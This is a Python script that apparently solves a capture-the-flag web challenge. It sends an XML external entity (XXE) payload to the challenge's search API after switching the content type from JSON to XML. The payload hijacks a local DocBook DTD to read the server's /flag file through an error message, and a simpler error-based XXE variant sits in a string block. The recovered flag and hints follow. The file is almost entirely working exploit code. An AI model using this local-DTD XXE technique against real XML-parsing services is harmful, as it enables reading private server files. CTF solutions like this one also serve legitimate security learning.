import requests

headers = {
    'origin': 'https://bnv.web.ctfcompetition.com',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'content-type': 'application/xml',
    'accept': '*/*',
    'referer': 'https://bnv.web.ctfcompetition.com/',
    'authority': 'bnv.web.ctfcompetition.com',
}

'''
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x26;#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
'''

data = '''
<!--?xml version="1.0"?-->
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOtech '
        <!ENTITY &#x25; file SYSTEM "file:///flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<message>135601360123502401401250</message>
'''

response = requests.post('https://bnv.web.ctfcompetition.com/api/search', headers=headers, data=data)
print response.text

# CTF{0x1033_75008_1004x0}

# Change Content-Type application/json to application/xml
# Think more deep.
